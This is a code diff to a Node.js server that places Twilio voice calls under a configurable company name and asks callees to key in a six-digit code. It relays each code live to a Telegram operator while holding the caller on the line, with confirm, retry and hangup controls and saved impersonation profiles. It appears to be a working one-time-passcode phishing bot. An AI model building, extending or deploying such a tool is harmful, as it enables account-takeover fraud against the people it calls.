@@ -1,8 +1,8 @@
 const express = require("express");
-const fetch = require("node-fetch");
-const twilio = require("twilio");
 const fs = require("fs");
 const path = require("path");
+const fetch = require("node-fetch");
+const twilio = require("twilio");
 
 const app = express();
 app.use(express.json());
@@ -23,7 +23,7 @@ const TWILIO_NUMBER = process.env.TWILIO_NUMBER;
 const BASE_URL = process.env.BASE_URL || "";
 const ALLOWED_CHAT_IDS = (process.env.ALLOWED_CHAT_IDS || CHAT_ID || "")
   .split(",")
-  .map(x => x.trim())
+  .map(s => s.trim())
   .filter(Boolean);
 
 const QUICK_DIAL_A_LABEL = process.env.QUICK_DIAL_A_LABEL || "Quick A";
@@ -36,29 +36,34 @@ const QUICK_DIAL_C_NUMBER = process.env.QUICK_DIAL_C_NUMBER || "";
 const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);
 
 // ===== DB =====
-// Note: db.json persists on the current disk, but some hosts may reset it on redeploy.
 const DB_FILE = path.join(__dirname, "db.json");
 
-const defaultDB = {
-  settings: {
-    company: "Support",
-    digits: 6,
-    assistant: 0,
-    itemName: "ticket number",
-    greeting:
-      "Hello from {company}. Please enter your {digits} digit {item}.",
-    retryMessage: "Please re-enter your {item}.",
-    reviewMessage: "Please wait while we review your {item}.",
-    confirmMessage: "Thank you. Your {item} has been confirmed. Have a great day.",
-    failMessage: "Sorry, we could not confirm your {item}. Please contact support later.",
-    maxRetries: 3,
-    inputTimeout: 8,
-    holdSeconds: 10,
-    paused: false,
-    randomAssistant: false,
-    readback: false
-  },
+const defaultSettings = {
+  company: "Support",
+  digits: 6,
+  assistant: 0,
+  itemName: "ticket number",
+  greeting:
+    "Hello from {company}. Please enter your {digits} digit {item}.",
+  retryMessage: "Please re-enter your {item}.",
+  reviewMessage: "Please wait while we review your {item}.",
+  confirmMessage: "Thank you. Your {item} has been confirmed. Have a great day.",
+  failMessage: "Sorry, we could not confirm your {item}. Goodbye.",
+  maxRetries: 3,
+  inputTimeout: 8,
+  holdSeconds: 10,
+  autoConfirmSec: 0,
+  autoHangupSec: 0,
+  paused: false,
+  readback: false,
+  randomAssistant: false
+};
+
+let db = {
+  settings: { ...defaultSettings },
   profiles: {},
+  history: [],
+  logs: [],
   stats: {
     inboundCalls: 0,
     outboundCalls: 0,
@@ -66,36 +71,30 @@ const defaultDB = {
     confirmed: 0,
     retries: 0,
     hungUp: 0,
+    autoConfirmed: 0,
+    autoHungUp: 0,
+    scheduledCalls: 0,
     completedCalls: 0
-  },
-  logs: [],
-  history: [],
-  lastDialed: null
+  }
 };
 
 function loadDB() {
   try {
-    if (!fs.existsSync(DB_FILE)) return structuredClone(defaultDB);
-    const raw = fs.readFileSync(DB_FILE, "utf8");
-    const parsed = JSON.parse(raw);
-    return {
-      ...structuredClone(defaultDB),
-      ...parsed,
-      settings: {
-        ...structuredClone(defaultDB).settings,
-        ...(parsed.settings || {})
-      },
-      stats: {
-        ...structuredClone(defaultDB).stats,
-        ...(parsed.stats || {})
-      }
-    };
-  } catch {
-    return structuredClone(defaultDB);
+    if (fs.existsSync(DB_FILE)) {
+      const raw = fs.readFileSync(DB_FILE, "utf8");
+      const parsed = JSON.parse(raw);
+      db = {
+        settings: { ...defaultSettings, ...(parsed.settings || {}) },
+        profiles: parsed.profiles || {},
+        history: parsed.history || [],
+        logs: parsed.logs || [],
+        stats: { ...db.stats, ...(parsed.stats || {}) }
+      };
+    }
+  } catch (e) {
+    console.log("loadDB error:", e.message);
   }
 }
-
-let db = loadDB();
 
 function saveDB() {
   try {
@@ -105,7 +104,11 @@ function saveDB() {
   }
 }
 
-// ===== SETTINGS / STATIC DATA =====
+loadDB();
+
+// ===== SETTINGS =====
+let settings = db.settings;
+
 const assistants = [
   { name: "Nova", voice: "Polly.Joanna" },
   { name: "Lyra", voice: "Polly.Matthew" },
@@ -121,38 +124,18 @@ const quickDialTargets = {
   [QUICK_DIAL_C_LABEL]: QUICK_DIAL_C_NUMBER
 };
 
-// ===== RUNTIME STATE =====
-const calls = new Map(); // sid -> call state
+// ===== STATE =====
+const calls = new Map();
 let panelMessageId = null;
 let panelBrokenCount = 0;
-let pendingInput = null; // call/company/item/digits/assistant/greeting
+let pendingInput = null;
 let scheduledJobs = [];
-let lastCaller = null;
+let lastDialed = null;
+let panelDirty = false;
 
 // ===== HELPERS =====
-function settings() {
-  return db.settings;
-}
-
-function stats() {
-  return db.stats;
-}
-
-function logs() {
-  return db.logs;
-}
-
-function history() {
-  return db.history;
-}
-
-function assistant() {
-  return assistants[settings().assistant] || assistants[0];
-}
-
-function assistantForCall(call) {
-  if (!call) return assistant();
-  return assistants[call.assistantIndex] || assistant();
+function markPanelDirty() {
+  panelDirty = true;
 }
 
 function isAuthorized(update) {
@@ -166,23 +149,32 @@ function isAuthorized(update) {
   return ALLOWED_CHAT_IDS.includes(String(chatId));
 }
 
+function assistant() {
+  return assistants[settings.assistant] || assistants[0];
+}
+
+function assistantForCall(call) {
+  if (!call) return assistant();
+  return assistants[call.assistantIndex] || assistant();
+}
+
 function template(str, call = null) {
-  return String(str || "")
-    .replaceAll("{company}", settings().company)
-    .replaceAll("{digits}", String(settings().digits))
-    .replaceAll("{item}", settings().itemName)
+  return str
+    .replaceAll("{company}", settings.company)
+    .replaceAll("{digits}", String(settings.digits))
+    .replaceAll("{item}", settings.itemName)
     .replaceAll("{caller}", call?.caller || "caller");
 }
 
 function pushLog(text) {
   db.logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
-  db.logs = db.logs.slice(0, 40);
+  db.logs = db.logs.slice(0, 60);
   saveDB();
 }
 
 function pushHistory(text) {
   db.history.unshift(`${new Date().toLocaleString()} ${text}`);
-  db.history = db.history.slice(0, 150);
+  db.history = db.history.slice(0, 200);
   saveDB();
 }
 
@@ -190,9 +182,9 @@ function getOrCreateCall(callSid) {
   if (!callSid) return null;
 
   if (!calls.has(callSid)) {
-    const ai = settings().randomAssistant
+    const ai = settings.randomAssistant
       ? Math.floor(Math.random() * assistants.length)
-      : settings().assistant;
+      : settings.assistant;
 
     calls.set(callSid, {
       sid: callSid,
@@ -202,11 +194,27 @@ function getOrCreateCall(callSid) {
       startedAt: Date.now(),
       assistantIndex: ai,
       retries: 0,
-      endedAt: null
+      autoConfirmTimer: null,
+      autoHangupTimer: null,
+      endedAt: null,
+      readbackDone: false,
+      newInput: false
     });
   }
 
   return calls.get(callSid);
+}
+
+function removeCallTimers(call) {
+  if (!call) return;
+  if (call.autoConfirmTimer) {
+    clearTimeout(call.autoConfirmTimer);
+    call.autoConfirmTimer = null;
+  }
+  if (call.autoHangupTimer) {
+    clearTimeout(call.autoHangupTimer);
+    call.autoHangupTimer = null;
+  }
 }
 
 function cleanupEndedCalls() {
@@ -236,68 +244,20 @@ function newestActiveCall() {
   return sortedCalls().find(c => c.status !== "Ended" && c.status !== "Idle") || null;
 }
 
-function buildInputTwiml(call) {
-  return `
-<Response>
-<Gather numDigits="${settings().digits}" action="${BASE_URL}/input" method="POST" timeout="${settings().inputTimeout}">
-<Say voice="${assistantForCall(call).voice}">
-${template(settings().greeting, call)}
-</Say>
-</Gather>
-<Redirect method="POST">${BASE_URL}/ivr</Redirect>
-</Response>
-`;
+function spacedDigits(value) {
+  return String(value || "")
+    .split("")
+    .join(" ");
 }
 
-function buildRetryTwiml(call) {
-  return `
-<Response>
-<Gather numDigits="${settings().digits}" action="${BASE_URL}/input" method="POST" timeout="${settings().inputTimeout}">
-<Say voice="${assistantForCall(call).voice}">
-${template(settings().retryMessage, call)}
-</Say>
-</Gather>
-<Redirect method="POST">${BASE_URL}/hold</Redirect>
-</Response>
-`;
+function saveSettings() {
+  db.settings = settings;
+  saveDB();
 }
 
-function buildReviewTwiml(call) {
-  const readback = settings().readback && call?.input
-    ? `<Say voice="${assistantForCall(call).voice}">You entered ${String(call.input).split("").join(" ")}.</Say>`
-    : "";
-
-  return `
-<Response>
-${readback}
-<Say voice="${assistantForCall(call).voice}">
-${template(settings().reviewMessage, call)}
-</Say>
-<Redirect method="POST">${BASE_URL}/hold</Redirect>
-</Response>
-`;
-}
-
-function buildConfirmTwiml(call) {
-  return `
-<Response>
-<Say voice="${assistantForCall(call).voice}">
-${template(settings().confirmMessage, call)}
-</Say>
-<Hangup/>
-</Response>
-`;
-}
-
-function buildFailTwiml(call) {
-  return `
-<Response>
-<Say voice="${assistantForCall(call).voice}">
-${template(settings().failMessage, call)}
-</Say>
-<Hangup/>
-</Response>
-`;
+function incStat(key) {
+  db.stats[key] = (db.stats[key] || 0) + 1;
+  saveDB();
 }
 
 // ===== TELEGRAM =====
@@ -311,13 +271,20 @@ async function tg(method, data) {
 }
 
 async function tgSend(text, buttons = null) {
-  const body = { chat_id: CHAT_ID, text };
+  const body = {
+    chat_id: CHAT_ID,
+    text
+  };
   if (buttons) body.reply_markup = { inline_keyboard: buttons };
   return tg("sendMessage", body);
 }
 
 async function tgEdit(messageId, text, buttons = null) {
-  const body = { chat_id: CHAT_ID, message_id: messageId, text };
+  const body = {
+    chat_id: CHAT_ID,
+    message_id: messageId,
+    text
+  };
   if (buttons) body.reply_markup = { inline_keyboard: buttons };
   return tg("editMessageText", body);
 }
@@ -334,13 +301,19 @@ async function tgAnswerCallback(callbackQueryId, text = "") {
 // ===== PANEL =====
 function panelButtons() {
   const quickButtons = Object.entries(quickDialTargets)
-    .filter(([, num]) => num)
+    .filter(([, value]) => value)
     .slice(0, 3)
-    .map(([label]) => ({ text: `📲 ${label}`, callback_data: `qd:${label}` }));
+    .map(([label]) => ({
+      text: `📲 ${label}`,
+      callback_data: `qd:${label}`
+    }));
 
   const profileButtons = Object.keys(db.profiles)
     .slice(0, 4)
-    .map(name => ({ text: `📁 ${name}`, callback_data: `profile:${name}` }));
+    .map(name => ({
+      text: `📁 ${name}`,
+      callback_data: `profile:${name}`
+    }));
 
   const rows = [
     [
@@ -351,18 +324,17 @@ function panelButtons() {
     [
       { text: "📞 Call Last", callback_data: "calllast" },
       { text: "📲 Call", callback_data: "call" }
+    ],
+    [{ text: settings.paused ? "▶ Resume" : "⏸ Pause", callback_data: settings.paused ? "resume" : "pause" }],
+    [{ text: "⚡ Wake Server", callback_data: "wake" }],
+    [
+      { text: "📊 Status", callback_data: "status" },
+      { text: "📜 Logs", callback_data: "logs" }
     ]
   ];
 
-  if (quickButtons.length) rows.push(quickButtons);
-  if (profileButtons.length) rows.push(profileButtons);
-
-  rows.push([{ text: settings().paused ? "▶ Resume" : "⏸ Pause", callback_data: settings().paused ? "resume" : "pause" }]);
-  rows.push([{ text: "⚡ Wake Server", callback_data: "wake" }]);
-  rows.push([
-    { text: "📊 Status", callback_data: "status" },
-    { text: "📜 Logs", callback_data: "logs" }
-  ]);
+  if (quickButtons.length) rows.splice(3, 0, quickButtons);
+  if (profileButtons.length) rows.splice(4, 0, profileButtons);
 
   return rows;
 }
@@ -378,23 +350,38 @@ function panelText() {
     lines.push("");
   } else {
     active.forEach((call, index) => {
-      lines.push(`${index + 1}) ${call.status}`);
+      const statusIcon =
+        call.status === "Ringing" ? "📳" :
+        call.status === "Answered" ? "🟢" :
+        call.status === "Held" ? "⏳" :
+        call.status === "Paused" ? "⏸" :
+        call.status === "Ended" ? "⚫" : "⚪";
+
+      let inputText = call.input || "waiting";
+      if (call.newInput) {
+        inputText = `🔥 ${inputText}`;
+        call.newInput = false;
+      }
+
+      lines.push(`📞 CALL ${index + 1} — ${statusIcon} ${call.status}`);
       lines.push(`Caller: ${call.caller || "Unknown"}`);
-      lines.push(`${settings().itemName}: ${call.input || "waiting"}`);
-      lines.push(`Retries: ${call.retries}/${settings().maxRetries}`);
+      lines.push(`${settings.itemName}: ${inputText}`);
+      lines.push(`Retries: ${call.retries}/${settings.maxRetries}`);
       lines.push(`Assistant: ${assistantForCall(call).name}`);
       lines.push(`Time: ${callTimerText(call)}`);
       lines.push("");
     });
   }
 
-  lines.push(`Company: ${settings().company}`);
-  lines.push(`Digits: ${settings().digits}`);
+  lines.push(`Company: ${settings.company}`);
+  lines.push(`Digits: ${settings.digits}`);
   lines.push(`Assistant: ${assistant().name}`);
-  lines.push(`Item: ${settings().itemName}`);
-  lines.push(`Paused: ${settings().paused ? "Yes" : "No"}`);
-  lines.push(`Max Retries: ${settings().maxRetries}`);
-  lines.push(`Input Timeout: ${settings().inputTimeout}s`);
+  lines.push(`Item: ${settings.itemName}`);
+  lines.push(`Paused: ${settings.paused ? "Yes" : "No"}`);
+  lines.push(`Max Retries: ${settings.maxRetries}`);
+  lines.push(`Input Timeout: ${settings.inputTimeout}s`);
+  lines.push(`Auto Confirm: ${settings.autoConfirmSec || 0}s`);
+  lines.push(`Auto Hangup: ${settings.autoHangupSec || 0}s`);
 
   return lines.join("\n");
 }
@@ -414,7 +401,7 @@ async function updatePanel(forceNew = false) {
 
     const result = await tgEdit(panelMessageId, text, buttons);
 
-    if (result && result.ok === false) {
+    if (!result || result.ok === false) {
       panelBrokenCount++;
       if (panelBrokenCount >= 2) {
         panelMessageId = null;
@@ -425,22 +412,23 @@ async function updatePanel(forceNew = false) {
     }
   } catch {
     panelBrokenCount++;
-    if (panelBrokenCount >= 2) panelMessageId = null;
+    if (panelBrokenCount >= 2) {
+      panelMessageId = null;
+    }
   }
 }
 
-// ===== CALL CONTROL =====
+// ===== TWILIO CONTROL =====
 async function startCall(number) {
   if (!number) return;
 
-  if (settings().paused) {
+  if (settings.paused) {
     await tgSend("⏸ Outbound calling is paused");
     return;
   }
 
-  db.lastDialed = number;
-  stats().outboundCalls++;
-  saveDB();
+  lastDialed = number;
+  incStat("outboundCalls");
 
   await client.calls.create({
     url: `${BASE_URL}/ivr`,
@@ -453,6 +441,7 @@ async function startCall(number) {
 
   pushLog(`Outbound call started to ${number}`);
   pushHistory(`Outbound call to ${number}`);
+  markPanelDirty();
 }
 
 async function updateLiveCallTwiml(callSid, twiml) {
@@ -467,13 +456,140 @@ async function endLiveCallImmediately(callSid) {
   });
 }
 
+function buildInputTwiml(call) {
+  const voice = assistantForCall(call).voice;
+  const greeting = template(settings.greeting, call);
+
+  return `
+<Response>
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="${settings.inputTimeout}">
+<Say voice="${voice}">
+${greeting}
+</Say>
+</Gather>
+<Redirect method="POST">${BASE_URL}/ivr</Redirect>
+</Response>
+`;
+}
+
+function buildRetryTwiml(call) {
+  const voice = assistantForCall(call).voice;
+  const retryText = template(settings.retryMessage, call);
+
+  return `
+<Response>
+<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="${settings.inputTimeout}">
+<Say voice="${voice}">
+${retryText}
+</Say>
+</Gather>
+<Redirect method="POST">${BASE_URL}/hold</Redirect>
+</Response>
+`;
+}
+
+function buildReviewTwiml(call) {
+  const voice = assistantForCall(call).voice;
+  const reviewText = template(settings.reviewMessage, call);
+
+  if (settings.readback && call && call.input && !call.readbackDone) {
+    call.readbackDone = true;
+    return `
+<Response>
+<Say voice="${voice}">
+You entered ${spacedDigits(call.input)}.
+</Say>
+<Say voice="${voice}">
+${reviewText}
+</Say>
+<Redirect method="POST">${BASE_URL}/hold</Redirect>
+</Response>
+`;
+  }
+
+  return `
+<Response>
+<Say voice="${voice}">
+${reviewText}
+</Say>
+<Redirect method="POST">${BASE_URL}/hold</Redirect>
+</Response>
+`;
+}
+
+function buildConfirmTwiml(call) {
+  const voice = assistantForCall(call).voice;
+  return `
+<Response>
+<Say voice="${voice}">
+${template(settings.confirmMessage, call)}
+</Say>
+<Hangup/>
+</Response>
+`;
+}
+
+function buildFailureTwiml(call) {
+  const voice = assistantForCall(call).voice;
+  return `
+<Response>
+<Say voice="${voice}">
+${template(settings.failMessage, call)}
+</Say>
+<Hangup/>
+</Response>
+`;
+}
+
+function schedulePerCallTimers(call) {
+  removeCallTimers(call);
+
+  if (!call || call.status === "Ended") return;
+
+  if (settings.autoConfirmSec > 0) {
+    call.autoConfirmTimer = setTimeout(async () => {
+      try {
+        if (call.status !== "Ended" && call.sid) {
+          await updateLiveCallTwiml(call.sid, buildConfirmTwiml(call));
+          call.status = "Ended";
+          call.endedAt = Date.now();
+          incStat("confirmed");
+          incStat("autoConfirmed");
+          incStat("completedCalls");
+          pushLog(`Auto confirmed ${call.caller || call.sid}`);
+          pushHistory(`Auto confirmed ${call.caller || call.sid}`);
+          markPanelDirty();
+        }
+      } catch {}
+    }, settings.autoConfirmSec * 1000);
+  }
+
+  if (settings.autoHangupSec > 0) {
+    call.autoHangupTimer = setTimeout(async () => {
+      try {
+        if (call.status !== "Ended" && call.sid) {
+          await endLiveCallImmediately(call.sid);
+          call.status = "Ended";
+          call.endedAt = Date.now();
+          incStat("hungUp");
+          incStat("autoHungUp");
+          incStat("completedCalls");
+          pushLog(`Auto hung up ${call.caller || call.sid}`);
+          pushHistory(`Auto hung up ${call.caller || call.sid}`);
+          markPanelDirty();
+        }
+      } catch {}
+    }, settings.autoHangupSec * 1000);
+  }
+}
+
 function scheduleOutboundCall(number, delayMs) {
   const id = Date.now() + Math.random();
+
   const timeout = setTimeout(async () => {
     try {
       await startCall(number);
-      stats().scheduledCalls = (stats().scheduledCalls || 0) + 1;
-      saveDB();
+      incStat("scheduledCalls");
       pushLog(`Scheduled call fired to ${number}`);
       pushHistory(`Scheduled call fired to ${number}`);
     } catch (e) {
@@ -483,7 +599,7 @@ function scheduleOutboundCall(number, delayMs) {
     }
   }, delayMs);
 
-  scheduledJobs.push({ id, number, timeout, fireAt: Date.now() + delayMs });
+  scheduledJobs.push({ id, number, fireAt: Date.now() + delayMs, timeout });
 }
 
 function parseDelay(text) {
@@ -501,19 +617,7 @@ function parseDelay(text) {
   return null;
 }
 
-function loadProfile(name) {
-  const p = db.profiles[name];
-  if (!p) return false;
-
-  db.settings.assistant = p.assistant;
-  db.settings.digits = p.digits;
-  db.settings.itemName = p.itemName;
-  db.settings.company = p.company;
-  saveDB();
-  return true;
-}
-
-// ===== ROOT =====
+// ===== ROUTES =====
 app.get("/", (req, res) => {
   res.send("Server running");
 });
@@ -527,8 +631,8 @@ app.get("/health", (req, res) => {
     status: "ok",
     time: Date.now(),
     activeCalls: sortedCalls().filter(c => c.status !== "Ended").length,
-    paused: settings().paused,
-    lastDialed: db.lastDialed
+    paused: settings.paused,
+    lastDialed
   });
 });
 
@@ -537,7 +641,7 @@ app.get("/ivr", (req, res) => {
   res.send(`<Response><Say>IVR endpoint is working.</Say></Response>`);
 });
 
-// ===== TWILIO STATUS =====
+// ===== CALL STATUS =====
 app.post("/call-status", async (req, res) => {
   try {
     const status = req.body.CallStatus;
@@ -561,11 +665,11 @@ app.post("/call-status", async (req, res) => {
       if (status === "completed") {
         call.status = "Ended";
         call.endedAt = Date.now();
-        stats().completedCalls++;
-        saveDB();
+        removeCallTimers(call);
+        incStat("completedCalls");
       }
 
-      updatePanel();
+      markPanelDirty();
     }
   } catch (e) {
     console.log("call-status error:", e.message);
@@ -583,22 +687,19 @@ app.post("/ivr", async (req, res) => {
     const call = getOrCreateCall(sid);
     if (call) {
       call.caller = from || call.caller;
-      call.status = settings().paused ? "Paused" : "Answered";
+      call.status = settings.paused ? "Paused" : "Answered";
       call.startedAt = call.startedAt || Date.now();
-      call.assistantIndex = settings().randomAssistant
+      call.assistantIndex = settings.randomAssistant
         ? Math.floor(Math.random() * assistants.length)
-        : settings().assistant;
+        : settings.assistant;
     }
 
-    lastCaller = from || lastCaller;
-    stats().inboundCalls++;
-    saveDB();
-
-    await updatePanel();
+    incStat("inboundCalls");
+    markPanelDirty();
 
     res.type("text/xml");
 
-    if (settings().paused) {
+    if (settings.paused) {
       return res.send(`
 <Response>
 <Say voice="${assistantForCall(call).voice}">
@@ -617,7 +718,7 @@ Calling is currently paused. Please try again later.
   }
 });
 
-// ===== INPUT RECEIVED =====
+// ===== INPUT =====
 app.post("/input", async (req, res) => {
   try {
     const digits = req.body.Digits;
@@ -628,29 +729,30 @@ app.post("/input", async (req, res) => {
     if (call) {
       call.caller = caller;
       call.input = digits;
-      call.status = "Answered";
+      call.status = "Held";
       call.startedAt = Date.now();
+      call.readbackDone = false;
+      call.newInput = true;
     }
 
-    lastCaller = caller;
-    stats().inputsReceived++;
-    saveDB();
-
+    incStat("inputsReceived");
     pushLog(`${caller} : ${digits}`);
-    pushHistory(`${caller} -> ${settings().itemName}: ${digits}`);
+    pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
 
     res.type("text/xml");
     res.send(buildReviewTwiml(call));
 
     try {
-      await tgSend(`📞 INPUT RECEIVED
+      await tgSend(`🔑 NEW ${settings.itemName.toUpperCase()}
 
-Caller: ${caller}
-${settings().itemName}: ${digits}`);
-      await updatePanel();
+👤 Caller: ${caller}
+📟 Code: ${digits}`);
+      markPanelDirty();
     } catch (e) {
       console.log("post-input telegram error:", e.message);
     }
+
+    schedulePerCallTimers(call);
   } catch (e) {
     console.log("/input error:", e.message);
     res.type("text/xml");
@@ -658,18 +760,18 @@ ${settings().itemName}: ${digits}`);
   }
 });
 
-// ===== HOLD LOOP =====
+// ===== HOLD =====
 app.post("/hold", (req, res) => {
   res.type("text/xml");
   res.send(`
 <Response>
-<Pause length="${settings().holdSeconds}"/>
+<Pause length="${settings.holdSeconds}"/>
 <Redirect method="POST">${BASE_URL}/hold</Redirect>
 </Response>
 `);
 });
 
-// ===== TELEGRAM WEBHOOK =====
+// ===== TELEGRAM =====
 app.post("/telegram", async (req, res) => {
   try {
     const update = req.body || {};
@@ -689,12 +791,12 @@ app.post("/telegram", async (req, res) => {
           await updateLiveCallTwiml(callSid, buildConfirmTwiml(call));
           call.status = "Ended";
           call.endedAt = Date.now();
-          stats().confirmed++;
-          stats().completedCalls++;
-          saveDB();
+          removeCallTimers(call);
+          incStat("confirmed");
+          incStat("completedCalls");
           pushLog("Confirmed");
           pushHistory(`Confirmed ${call.caller || call.sid}`);
-          await updatePanel();
+          markPanelDirty();
         }
         await tgAnswerCallback(callbackId, "Confirmed");
         return res.sendStatus(200);
@@ -704,24 +806,24 @@ app.post("/telegram", async (req, res) => {
         if (callSid) {
           call.retries++;
 
-          if (call.retries >= settings().maxRetries) {
-            await updateLiveCallTwiml(callSid, buildFailTwiml(call));
+          if (call.retries >= settings.maxRetries) {
+            await updateLiveCallTwiml(callSid, buildFailureTwiml(call));
             call.status = "Ended";
             call.endedAt = Date.now();
-            stats().completedCalls++;
-            saveDB();
+            removeCallTimers(call);
+            incStat("completedCalls");
             pushLog("Max retries reached");
             pushHistory(`Max retries reached for ${call.caller || call.sid}`);
           } else {
             await updateLiveCallTwiml(callSid, buildRetryTwiml(call));
             call.input = null;
-            stats().retries++;
-            saveDB();
+            call.status = "Answered";
+            incStat("retries");
             pushLog("Retry requested");
           }
         }
 
-        await updatePanel();
+        markPanelDirty();
         await tgAnswerCallback(callbackId, "Retry sent");
         return res.sendStatus(200);
       }
@@ -731,21 +833,21 @@ app.post("/telegram", async (req, res) => {
           await endLiveCallImmediately(callSid);
           call.status = "Ended";
           call.endedAt = Date.now();
-          stats().hungUp++;
-          stats().completedCalls++;
-          saveDB();
+          removeCallTimers(call);
+          incStat("hungUp");
+          incStat("completedCalls");
           pushLog("Hung up");
           pushHistory(`Hung up ${call.caller || call.sid}`);
-          await updatePanel();
+          markPanelDirty();
         }
         await tgAnswerCallback(callbackId, "Hung up");
         return res.sendStatus(200);
       }
 
       if (action === "calllast") {
-        if (db.lastDialed) {
-          await startCall(db.lastDialed);
-          await tgSend(`📞 Calling last dialed number ${db.lastDialed}`);
+        if (lastDialed) {
+          await startCall(lastDialed);
+          await tgSend(`📞 Calling last dialed number ${lastDialed}`);
         } else {
           await tgSend("No previous outbound call");
         }
@@ -761,39 +863,39 @@ app.post("/telegram", async (req, res) => {
       }
 
       if (action === "pause") {
-        db.settings.paused = true;
-        saveDB();
-        await updatePanel();
+        settings.paused = true;
+        saveSettings();
+        markPanelDirty();
         await tgAnswerCallback(callbackId, "Paused");
         return res.sendStatus(200);
       }
 
       if (action === "resume") {
-        db.settings.paused = false;
-        saveDB();
-        await updatePanel();
+        settings.paused = false;
+        saveSettings();
+        markPanelDirty();
         await tgAnswerCallback(callbackId, "Resumed");
         return res.sendStatus(200);
       }
 
       if (action === "wake") {
-        await fetch(BASE_URL);
-        await fetch(BASE_URL + "/ping");
-        await fetch(BASE_URL + "/health");
+        await fetch(BASE_URL).catch(() => {});
+        await fetch(BASE_URL + "/ping").catch(() => {});
+        await fetch(BASE_URL + "/health").catch(() => {});
         await tgSend("⚡ Server wake request sent");
         await tgAnswerCallback(callbackId, "Server waking");
         return res.sendStatus(200);
       }
 
       if (action === "status") {
-        await updatePanel();
+        markPanelDirty();
         await tgAnswerCallback(callbackId, "Panel refreshed");
         return res.sendStatus(200);
       }
 
       if (action === "logs") {
         let text = "📜 Logs\n\n";
-        logs().forEach(l => {
+        db.logs.slice(0, 25).forEach(l => {
           text += l + "\n";
         });
         await tgSend(text);
@@ -816,13 +918,19 @@ app.post("/telegram", async (req, res) => {
 
       if (action.startsWith("profile:")) {
         const name = action.split(":")[1];
-        if (loadProfile(name)) {
+        const profile = db.profiles[name];
+        if (profile) {
+          settings.company = profile.company;
+          settings.digits = profile.digits;
+          settings.assistant = profile.assistant;
+          settings.itemName = profile.itemName;
+          saveSettings();
           await tgSend(`📁 Profile loaded: ${name}`);
-          await updatePanel();
+          markPanelDirty();
         } else {
           await tgSend("Profile not found");
         }
-        await tgAnswerCallback(callbackId, "Profile loaded");
+        await tgAnswerCallback(callbackId, "Profile");
         return res.sendStatus(200);
       }
     }
@@ -858,14 +966,19 @@ app.post("/telegram", async (req, res) => {
 /assistant X
 /company NAME
 /item NAME
-/saveprofile NAME
 /profile NAME
-/profiles
+/saveprofile NAME
 /deleteprofile NAME
+/profiles
+/maxretries X
+/timeout X
+/autoconfirm X
+/autohangup X
 /pause
 /resume
 /stop
 /quickdials
+/schedule +number 10m
 /settings`);
         return res.sendStatus(200);
       }
@@ -873,25 +986,28 @@ app.post("/telegram", async (req, res) => {
       if (text === "/settings") {
         await tgSend(`⚙ Current Settings
 
-Company: ${settings().company}
-Digits: ${settings().digits}
+Company: ${settings.company}
+Digits: ${settings.digits}
 Assistant: ${assistant().name}
-Item: ${settings().itemName}
-Max Retries: ${settings().maxRetries}
-Paused: ${settings().paused ? "Yes" : "No"}`);
+Item: ${settings.itemName}
+Max Retries: ${settings.maxRetries}
+Input Timeout: ${settings.inputTimeout}
+Auto Confirm: ${settings.autoConfirmSec}
+Auto Hangup: ${settings.autoHangupSec}
+Paused: ${settings.paused ? "Yes" : "No"}`);
         return res.sendStatus(200);
       }
 
       if (text === "/logs") {
         let textOut = "📜 Logs\n\n";
-        logs().forEach(l => (textOut += l + "\n"));
+        db.logs.slice(0, 25).forEach(l => (textOut += l + "\n"));
         await tgSend(textOut);
         return res.sendStatus(200);
       }
 
       if (text === "/history") {
         let textOut = "🗂 History\n\n";
-        history().slice(0, 30).forEach(l => (textOut += l + "\n"));
+        db.history.slice(0, 30).forEach(l => (textOut += l + "\n"));
         await tgSend(textOut);
         return res.sendStatus(200);
       }
@@ -899,13 +1015,74 @@ Paused: ${settings().paused ? "Yes" : "No"}`);
       if (text === "/stats") {
         await tgSend(`📈 Stats
 
-Inbound: ${stats().inboundCalls}
-Outbound: ${stats().outboundCalls}
-Inputs: ${stats().inputsReceived}
-Confirmed: ${stats().confirmed}
-Retries: ${stats().retries}
-Hung Up: ${stats().hungUp}
-Completed: ${stats().completedCalls}`);
+Inbound: ${db.stats.inboundCalls}
+Outbound: ${db.stats.outboundCalls}
+Inputs: ${db.stats.inputsReceived}
+Confirmed: ${db.stats.confirmed}
+Retries: ${db.stats.retries}
+Hung Up: ${db.stats.hungUp}
+Auto Confirmed: ${db.stats.autoConfirmed}
+Auto Hung Up: ${db.stats.autoHungUp}
+Completed: ${db.stats.completedCalls}
+Scheduled: ${db.stats.scheduledCalls}`);
+        return res.sendStatus(200);
+      }
+
+      if (text === "/profiles") {
+        const names = Object.keys(db.profiles);
+        if (!names.length) {
+          await tgSend("No saved profiles");
+        } else {
+          await tgSend("📁 Profiles\n\n" + names.join("\n"));
+        }
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith("/saveprofile")) {
+        const name = text.split(" ")[1];
+        if (!name) {
+          await tgSend("Usage: /saveprofile name");
+        } else {
+          db.profiles[name] = {
+            company: settings.company,
+            digits: settings.digits,
+            assistant: settings.assistant,
+            itemName: settings.itemName
+          };
+          saveDB();
+          await tgSend(`✅ Profile saved: ${name}`);
+          markPanelDirty();
+        }
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith("/profile")) {
+        const name = text.split(" ")[1];
+        if (!name || !db.profiles[name]) {
+          await tgSend("Profile not found");
+        } else {
+          const p = db.profiles[name];
+          settings.company = p.company;
+          settings.digits = p.digits;
+          settings.assistant = p.assistant;
+          settings.itemName = p.itemName;
+          saveSettings();
+          await tgSend(`📁 Profile loaded: ${name}`);
+          markPanelDirty();
+        }
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith("/deleteprofile")) {
+        const name = text.split(" ")[1];
+        if (!name || !db.profiles[name]) {
+          await tgSend("Profile not found");
+        } else {
+          delete db.profiles[name];
+          saveDB();
+          await tgSend(`🗑 Profile deleted: ${name}`);
+          markPanelDirty();
+        }
         return res.sendStatus(200);
       }
 
@@ -921,11 +1098,11 @@ Completed: ${stats().completedCalls}`);
       }
 
       if (text === "/calllast") {
-        if (!db.lastDialed) {
+        if (!lastDialed) {
           await tgSend("No previous outbound call");
         } else {
-          await startCall(db.lastDialed);
-          await tgSend(`📞 Calling ${db.lastDialed}`);
+          await startCall(lastDialed);
+          await tgSend(`📞 Calling ${lastDialed}`);
         }
         return res.sendStatus(200);
